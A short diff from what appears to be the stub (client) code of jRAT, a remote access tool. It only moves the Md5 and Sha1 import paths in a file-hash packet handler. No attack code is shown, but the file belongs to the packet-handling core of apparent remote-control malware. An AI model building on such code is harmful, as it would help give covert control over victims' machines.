@@ -2,11 +2,11 @@ package pro.jrat.stub.packets.incoming;
 
 import java.io.File;
 
+import pro.jrat.common.codec.Md5;
+import pro.jrat.common.codec.Sha1;
 import pro.jrat.stub.Connection;
 import pro.jrat.stub.packets.outgoing.Packet46FileHash;
 
-import com.redpois0n.common.codec.Md5;
-import com.redpois0n.common.codec.Sha1;
 
 public class Packet64FileHash extends AbstractIncomingPacket {
 
